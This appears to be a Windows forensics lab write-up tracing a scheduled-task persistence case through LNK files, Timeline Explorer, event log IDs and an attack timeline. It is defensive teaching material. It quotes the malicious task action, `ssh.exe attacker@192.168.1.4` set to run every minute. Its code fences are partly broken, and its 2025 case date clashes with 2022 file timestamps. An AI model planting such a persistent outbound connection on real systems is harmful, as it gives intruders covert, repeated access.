# Task 1 — Introduction
```markdown

**Case Date:** 2025-03-29  
**Victim User:** Aashir

Scope includes Windows persistence, recently accessed items, process/file execution evidence, Windows event logs, and timeline analysis.
```

---

# Task 3 — Timeline Explorer for Visualization

```markdown

**Tools:** Eric Zimmerman's Timeline Explorer  
**Artifacts:** CSV exports from LNK parsing, task XML timestamps, event logs

### Steps
1. Parse LNK files (see Task 5) to CSV.
2. Import CSV into **Timeline Explorer** and align on local time.
3. Correlate RAR and Scheduled Task creation windows.

### Outcome
- Confirmed RAR activity shortly before Scheduled Task creation.
```

---

# Task 4 — Investigating Persistence (Scheduled Tasks)

````markdown

**Goal:** Identify persistence via Windows Task Scheduler.

### GUI Method
- Open **Task Scheduler** → `Task Scheduler Library`
- Inspect properties of suspicious task (e.g., **Updater**)
- Check **Actions** → `ssh.exe attacker@192.168.1.4` (example)

### Disk Method
- Navigate: `C:\\Windows\\System32\\Tasks\\`
- Open `Updater` (XML). Look for `<Exec><Command>` and `<Arguments>`

### CLI/Export
```powershell
# Export a task's XML to Evidence
$taskName = 'Updater'
$dest = "$(Resolve-Path .)\\Evidence\\Updater-Task.xml"
schtasks /query /tn $taskName /xml > $dest
````

## Findings

* **Malicious Task Name:** `Updater`
* **Action:** `C:\\Windows\\System32\\OpenSSH\\ssh.exe attacker@192.168.1.4`
* **Interval:** every 1 minute (trigger)

````

````
---

# Task 5 — Investigating Recently Accessed Files (LNK)
```markdown

**Artifact Path:** `C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent Items`

### Parse LNK with LECmd
```cmd
cd "C:\\Users\\Administrator\\Desktop\\Forensics Tools\\LECmd"
LECmd.exe -d C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Recent --csvf Parsed-LNK.csv --csv C:\\Users\\Administrator\\Desktop
````

Move `Parsed-LNK.csv` to `/Evidence/`.

### Review in Timeline Explorer

* Columns of interest: **Target Created** (file), **Source Created** (LNK)

### Findings

* **RAR File Name:** `secrets.rar`
* **Target Created (file creation):** `2022-09-30 10:27:20`
* **Source Created (lnk creation):** `≈ 10:27:30`

````
````
---

# Task 6 — Investigating File Execution
```markdown

**Approaches:**
- Shimcache/Amcache (if provided)
- Prefetch (if enabled)
- SRUM/RecentFileCache.bcf (context dependent)
- Event Logs: `Microsoft-Windows-Security-Mitigations` and `Sysmon` (if present)

**Goal:** Link execution of ssh.exe and any staging/exfil tools.
````

---

# Task 7 — The Dig of Executable

```markdown

Investigate metadata & reputation for binaries observed (e.g., ssh.exe invocation chain, any droppers or scripts).  
Capture hashes, signer info, VT/OSINT (do not upload sensitive corp files externally unless approved).
```

---

# Task 8 — Windows Event Log Analysis

````markdown

**Key IDs:**
- **4698** — Scheduled task created
- **4702** — Scheduled task updated
- **4688** — Process creation (CommandLine shows ssh target)
- **1102** — Audit log cleared (defense evasion)
- **7036** — Service state changes (defender-related)

### Export Examples
```cmd
wevtutil epl Security Evidence\Security.evtx /q:"*[System[(EventID=4698 or EventID=4702 or EventID=4688)]]"
wevtutil epl Microsoft-Windows-TaskScheduler/Operational Evidence\TaskScheduler.evtx
````

### What to Look For

* XML `EventData` → TaskName, Author, Command, Arguments
* Correlate timestamps with LNK & task creation

````

````
# Task 9 — Chronological Order of Attack

```markdown

1. **10:27:20** — `secrets.rar` created (user profile Recent Items LNK points to it)
2. **10:27:XX** — LNK created for the RAR (user interaction)
3. **10:29:00** — Scheduled Task `Updater` created to run every minute
4. Repeated **SSH attempts** to `192.168.1.4` observed and blocked
````

---
